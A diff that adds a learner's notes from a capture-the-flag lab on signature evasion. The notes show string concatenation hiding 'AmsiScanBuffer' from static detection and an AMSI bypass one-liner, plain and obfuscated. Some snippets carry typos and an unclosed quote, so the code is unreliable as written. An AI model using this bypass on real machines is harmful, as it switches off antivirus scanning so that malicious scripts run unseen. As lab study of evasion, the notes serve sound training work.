@@ -36,3 +36,20 @@ Code-Element >
     >Dropping Modifiers
 Signature Evasion Room    
     
+---------------------------------------------------------------------------------------------------------------------------------
+    
+Concatenation: combining two separate objects into a one object 
+-can be used to modify signatures or manipulate other aspects of an application
+-eg: static signatures - defined string "AmsiScanBuffer"
+IntPtr ASBPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer"); //alerts
+IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer"); //no alerts
+-non-interpreted characters: used to disrupt or confuse a static signature
+-breaks, reorders, whitespace, ticks, Random case
+
+challenge: obfuscate .ps1 code snippet using concatination and upload into the webserver to get the flag
+original: [Ref].Assmebly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+obfuscated: $Value="SetValue" [Ref}.Assmebly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic).$Value($null,$true)
+THM{koNC473n473_4LI_7H3_7H1n95}
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
